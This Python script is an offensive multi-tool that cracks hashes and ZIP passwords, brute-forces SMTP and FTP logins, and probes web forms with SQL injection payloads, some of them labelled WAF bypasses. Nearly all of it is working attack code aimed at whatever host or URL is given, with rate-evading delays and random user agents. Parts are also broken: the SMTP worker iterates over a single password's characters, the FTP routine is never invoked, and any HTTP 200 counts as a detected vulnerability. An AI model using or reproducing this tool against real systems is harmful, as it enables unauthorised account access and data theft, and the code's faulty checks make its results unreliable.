import hashlib
import pyzipper
import os
import sys
from tqdm import tqdm
import concurrent.futures
import logging
from itertools import islice
import argparse
import smtplib
import socket
import time
import ssl
import threading
import random
import ftplib
import queue
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from colorama import Fore, Back, Style, init
from fake_useragent import UserAgent

# Initialize colorama
init(autoreset=True)

# Set up logging
logging.basicConfig(filename='crack.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# List of supported hash types
hash_names = [
    'blake2b', 'blake2s', 'md5', 'sha1', 'sha224', 'sha256', 
    'sha384', 'sha3_224', 'sha3_256', 'sha3_384', 'sha3_512', 'sha512',
]

# Set up argument parsing
parser = argparse.ArgumentParser(description='Crack a hash, a ZIP password, perform an SMTP brute force attack, or SQLi scan using a wordlist.')
parser.add_argument('-ha', '--hash', type=str, help='The hash to crack')
parser.add_argument('-z', '--zip', type=str, help='Path to the ZIP file')
parser.add_argument('wordlist', type=str, help='Path to the wordlist file')
parser.add_argument('--hash-type', help='The hash type to use.', default='md5', choices=hash_names)
parser.add_argument('-e', '--extract', help='Path to extract the ZIP file contents', type=str)
parser.add_argument('-l', '--login', type=str, help="Username for SMTP brute force")
parser.add_argument('host', type=str, nargs='?', help="SMTP server host for brute force")  # Changed to optional
parser.add_argument('port', type=int, nargs='?', help="SMTP server port (e.g., 587 or 465)")  # Changed to optional
parser.add_argument('--redirect', help="Redirect URL to check for success condition")
parser.add_argument('-t', '--threads', type=int, default=4, help="Number of threads for parallel attack (default 4)")
parser.add_argument('--url', help="URL to test for SQLi vulnerabilities")
parser.add_argument('--random-agent', action='store_true', help="Use a random User-Agent for HTTP requests")

args = parser.parse_args()

# Ensure the wordlist exists
if not os.path.exists(args.wordlist):
    print(f"Error: Wordlist file '{args.wordlist}' not found.")
    sys.exit(1)

# Function to crack a hash
def crack_hash(hash, wordlist, hash_type):
    """Crack a hash using a wordlist."""
    hash_fn = getattr(hashlib, hash_type, None)
    if hash_fn is None or hash_type not in hash_names:
        raise ValueError(f'[!] Invalid hash type: {hash_type}, supported are {hash_names}')
    
    # Count the number of lines in the wordlist
    total_lines = sum(1 for line in open(wordlist, 'r'))
    print(f"[*] Cracking hash {hash} using {hash_type} with a list of {total_lines} words.")
    
    # Open the wordlist
    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        for line in tqdm(f, desc='Cracking hash', total=total_lines):
            if hash_fn(line.strip().encode()).hexdigest() == hash:
                return line.strip()

# Function to read passwords lazily (for large wordlists)
def read_passwords(wordlist_path, chunk_size=100):
    with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
        while True:
            chunk = list(islice(f, chunk_size))
            if not chunk:
                break
            yield [line.strip() for line in chunk]

# Brute force for ZIP file
def brute_force_zip(zip_file_path, wordlist_path, extraction_path):
    failed_attempts = []  # List to store failed attempts for one line of output
    with pyzipper.AESZipFile(zip_file_path) as zf:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as wordlist_file:
            for line in wordlist_file:
                password_str = line.strip()  # Remove any leading/trailing whitespace (e.g., newlines)
                try:
                    zf.pwd = password_str.encode('utf-8')
                    zf.extractall(path=extraction_path)
                    print(f"Password found: {password_str}")
                    return password_str
                except RuntimeError:
                    failed_attempts.append(password_str)  # Append failed attempt to the list
                    continue
                except Exception as e:
                    print(f"Error for: {password_str}, Error: {e}")
                    continue

    # Print all failed attempts in a single line after trying all passwords
    if failed_attempts:
        print(f"Attempt Failed: {' '.join(failed_attempts)}")  # Join all failed attempts into one line
    else:
        print("Password not found in the wordlist")

# SMTP Brute force attack
def smtp_bruteforce(username, wordlist, host, port, thread_id):
    try:
        # Create an unencrypted connection
        server = smtplib.SMTP(host, port, timeout=10)
        server.set_debuglevel(0)  # Set debug level

        # Use STARTTLS if supported
        server.starttls(context=ssl.create_default_context())

        # Try logging in
        for password in wordlist:
            password = password.strip()
            try:
                server.login(username, password)
                print(f"[+] [Thread-{thread_id}] Successfully logged in as {username} with password {password}")
                server.quit()
                return True
            except smtplib.SMTPAuthenticationError:
                print(f"[-] [Thread-{thread_id}] Failed login for {username} with password {password}")
                continue
        server.quit()
        return False
    except (smtplib.SMTPConnectError, socket.error) as e:
        print(f"[Thread-{thread_id}] Connection error: {e}")
        return False

# Function to handle the SMTP brute force using threads
def smtp_worker(username, wordlist, host, port, thread_id):
    for password in wordlist:
        password = password.strip()
        if smtp_bruteforce(username, password, host, port, thread_id):
            break
        time.sleep(random.uniform(0.5, 2.5))  # Random delay between attempts

# Initialize the FTP queue
q = queue.Queue()

# Number of threads to spawn for FTP
n_threads = 30

def connect_ftp(host, user):
    global q
    while True:
        # Get the password from the queue
        password = q.get()
        # Initialize the FTP server object
        server = ftplib.FTP()
        print("[!] Trying", password)
        try:
            # Try to connect to FTP server with a timeout of 5
            server.connect(host, 21, timeout=5)
            # Login using the credentials (user & password)
            server.login(user, password)
        except ftplib.error_perm:
            # Login failed, wrong credentials
            pass
        else:
            # Correct credentials
            print(f"[+] Found credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}")
            # We found the password, let's clear the queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            # Notify the queue that the task is completed for this password
            q.task_done()

# Function to detect forms on a webpage
def detect_forms(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        return forms
    except requests.RequestException as e:
        print(Fore.RED + f"[CRITICAL] Error while detecting forms: {e}")
        return []

# Function to check if a form uses POST
def is_post_form(form):
    method = form.get('method', 'get').lower()
    return method == 'post'

# Example function to check if a GET parameter is vulnerable to SQL injection
def test_sql_injection(url, forms, payloads, redirect_url=None):
    session = requests.Session()

    # Use random user agent if --random-agent is specified
    if args.random_agent:
        ua = UserAgent()
        headers = {
            "User-Agent": ua.random
        }
        session.headers.update(headers)
        print(Fore.CYAN + f"[INFO] Using random user-agent: {session.headers['User-Agent']}")

    vulnerable = False  # Track if SQLi vulnerability is detected

    # WAF bypass techniques
    waf_bypass_payloads = [
        "' OR 1=1 --",        # Basic SQLi with comment
        '" OR 1=1 --',
        "' OR 'a'='a' --",    # Bypassing some WAFs that look for 1=1
        "admin' --",          # Trying simple SQLi with common table names
        "1' OR 1=1#",         # SQLi with different comment style
        "'/**/OR/**/1=1/**/--",  # SQLi with space obfuscation
        "'/**/UNION/**/SELECT/**/NULL,username,password/**/FROM/**/users--",  # UNION-based injection
        "'/**/union/**/select/**/1,2,3,4--",  # UNION SELECT with obfuscation
        "'/*!50000UNION*/SELECT*FROM*users--",  # Using MySQL version-specific comment
    ]
    
    print(Fore.CYAN + f"[INFO] Testing connection to the target URL: {url}")
    
    # Step 1: Test POST forms first
    for form in forms:
        if is_post_form(form):
            action = form.get('action', '').strip()
            form_url = urljoin(url, action)  # Get the full URL for the form action
            for payload in waf_bypass_payloads:
                response = session.post(form_url, data={form.find('input')['name']: payload})
                if response.status_code == 200:
                    print(Fore.GREEN + f"SQL Injection vulnerability detected on form at {form_url} using payload: {payload}")
                    vulnerable = True
                    if redirect_url and response.url == redirect_url:
                        print(Fore.YELLOW + "Redirect confirmed, possible login bypass!")
                    break

    return vulnerable


# Main function with removed PDF cracking
def main():
    if args.hash:
        print("[*] Cracking hash:", args.hash)
        result = crack_hash(args.hash, args.wordlist, args.hash_type)
        if result:
            print(f"Password found: {result}")
        else:
            print("Password not found")
    elif args.zip:
        print("[*] Cracking ZIP file:", args.zip)
        password = brute_force_zip(args.zip, args.wordlist, args.extract)
        if password:
            print(f"Password found: {password}")
    elif args.url:
        print("[*] Testing SQL Injection:", args.url)
        forms = detect_forms(args.url)
        if forms:
            print(f"[INFO] Found {len(forms)} forms. Testing for SQL injection...")
            vulnerable = test_sql_injection(args.url, forms, [])
            if vulnerable:
                print(Fore.GREEN + "[+] The website is vulnerable to SQL injection.")
            else:
                print(Fore.RED + "[-] The website is NOT vulnerable to SQL injection.")
    else:
        print("[!] No action specified.")

if __name__ == "__main__":
    main()
